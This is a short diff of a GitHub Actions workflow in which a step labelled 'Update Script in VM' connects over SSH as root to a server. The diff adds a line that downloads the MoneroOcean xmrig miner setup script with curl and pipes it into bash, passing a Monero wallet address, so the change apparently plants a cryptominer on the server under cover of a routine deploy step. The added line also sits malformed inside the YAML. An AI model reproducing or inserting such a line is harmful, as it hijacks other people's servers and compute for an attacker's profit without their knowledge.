@@ -12,6 +12,7 @@ jobs:
         steps:
         - name: Update Script in VM
           uses: appleboy/ssh-action@master
+            curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 46egUxZjZpT6WcmSbwdycWMxKuVU1HxFWVKX5iUSokpWDSG14LVqnRk21SD7REgpsZBz7Qeytm36qjPJvvnv1XBPBnNniem
           with:
             host: 147.75.47.9
             username: root
